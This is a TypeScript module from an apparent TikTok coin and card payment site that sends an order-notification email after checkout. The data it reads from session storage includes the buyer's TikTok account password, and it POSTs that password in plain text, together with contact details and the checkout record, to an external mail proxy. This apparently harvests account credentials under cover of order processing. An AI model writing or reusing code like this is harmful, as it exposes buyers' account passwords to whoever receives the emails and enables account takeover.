import {
  PAYMENT_NOTIFICATION_DATA_KEY,
  type PaymentNotificationData,
  type PendingPaymentCheckout,
} from "@/app/lib/payments/payment-contract";

const MAILJET_PROXY_URL = (process.env.NEXT_PUBLIC_MAILJET_PROXY_URL ?? "").replace(/\/+$/, "");
const EMAIL_SENT_PREFIX = "nova-pay-payment-email-sent:";

function readNotificationData(orderId: string): PaymentNotificationData | null {
  try {
    const raw = window.sessionStorage.getItem(PAYMENT_NOTIFICATION_DATA_KEY);
    if (!raw) return null;
    const value: unknown = JSON.parse(raw);
    if (typeof value !== "object" || value === null || Array.isArray(value)) return null;
    const data = value as Partial<PaymentNotificationData>;
    if (
      data.orderId !== orderId ||
      typeof data.contactWhatsapp !== "string" ||
      !data.contactWhatsapp.trim() ||
      (data.productType !== "coins" && data.productType !== "card")
    ) return null;

    return {
      orderId,
      contactEmail: typeof data.contactEmail === "string" ? data.contactEmail.slice(0, 254) : undefined,
      contactWhatsapp: data.contactWhatsapp.slice(0, 40),
      country: typeof data.country === "string" ? data.country.slice(0, 120) : undefined,
      tiktokPassword: typeof data.tiktokPassword === "string" ? data.tiktokPassword.slice(0, 256) : undefined,
      productType: data.productType,
      productLabel: typeof data.productLabel === "string" ? data.productLabel.slice(0, 160) : undefined,
    };
  } catch {
    return null;
  }
}

function hasAlreadySent(orderId: string): boolean {
  try {
    return window.sessionStorage.getItem(`${EMAIL_SENT_PREFIX}${orderId}`) === "1";
  } catch {
    return false;
  }
}

function markAsSent(orderId: string): void {
  try {
    window.sessionStorage.setItem(`${EMAIL_SENT_PREFIX}${orderId}`, "1");
    window.sessionStorage.removeItem(PAYMENT_NOTIFICATION_DATA_KEY);
  } catch {
    // The confirmation screen remains usable when session storage is disabled.
  }
}

export async function sendOrderEmail(checkout: PendingPaymentCheckout): Promise<void> {
  if (!MAILJET_PROXY_URL || hasAlreadySent(checkout.orderId)) return;

  const notification = readNotificationData(checkout.orderId);
  if (!notification) return;

  const response = await fetch(`${MAILJET_PROXY_URL}/send`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ checkout, notification }),
    keepalive: true,
  });

  if (!response.ok) throw new Error("Mail notification request failed");
  markAsSent(checkout.orderId);
}
